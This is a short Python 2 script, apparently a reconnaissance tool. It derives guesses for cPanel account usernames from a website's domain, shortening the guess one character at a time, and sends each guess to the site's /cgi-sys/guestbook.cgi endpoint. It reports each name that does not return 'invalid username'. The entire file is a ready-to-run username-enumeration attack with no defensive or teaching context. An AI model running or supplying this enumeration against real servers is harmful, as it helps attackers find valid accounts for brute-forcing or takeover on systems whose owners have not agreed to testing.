#!/usr/bin/env python

import urllib2

site = raw_input('Enter a website >>> ')

try:
    users = site
    if 'http://www.' in users:
        users = users.replace('http://www.', '')
    if 'http://' in users:
        users = users.replace('http://', '')
    if '.' in users:
        users = users.replace('.', '')
    if '-' in users:
        users = users.replace('-', '')
    if '/' in users:
        users = users.replace('/', '')

    while len(users) > 2:
        print users
        resp = urllib2.urlopen(site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()
        # i can use regular expression too
        if 'invalid username' not in resp.lower():
            print "\tFound -> %s" %users
            pass

        users = users[:-1]

except:
    pass